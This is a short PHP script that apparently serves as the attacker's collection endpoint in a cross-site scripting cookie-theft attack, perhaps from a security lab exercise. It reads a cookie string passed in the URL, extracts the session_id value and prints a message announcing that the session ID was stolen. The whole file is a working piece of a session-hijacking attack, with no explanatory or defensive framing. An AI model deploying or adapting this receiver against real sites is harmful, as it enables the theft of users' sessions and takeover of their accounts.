<?php
	$pairs = preg_split("/;/", $_GET['cookie']);
	$session_id = NULL;
	for ($i = 0; $i < count($pairs); $i++) {
		$pair = preg_split("/=/", $pairs[$i]);
		$name = $pair[0];
		$value = $pair[1];

		if($name == "session_id"){
			$session_id = $value;
			break;
		}
	}
	if(!is_null($session_id)){
		echo "Succesfully stole session_id: " . $session_id;
	}
?>
